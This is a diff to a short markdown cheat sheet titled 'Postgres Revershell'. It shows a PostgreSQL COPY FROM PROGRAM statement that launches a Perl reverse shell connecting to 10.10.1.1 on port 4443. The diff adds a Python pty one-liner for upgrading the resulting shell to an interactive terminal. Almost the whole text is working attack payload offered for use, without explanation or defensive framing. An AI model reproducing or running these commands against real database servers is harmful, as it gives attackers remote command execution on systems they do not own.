@@ -1,5 +1,6 @@
 # Postgres Revershell
 
+SQL:
 ```sql
 CREATE TEMP TABLE out(line text);
 
@@ -7,4 +8,10 @@ COPY out FROM PROGRAM $$bash -c "perl -e 'use Socket;\$i=\"10.10.1.1\";\$p=4443;
 
 SELECT * FROM out;
 
+```
+
+
+Python TTY:
+```python
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
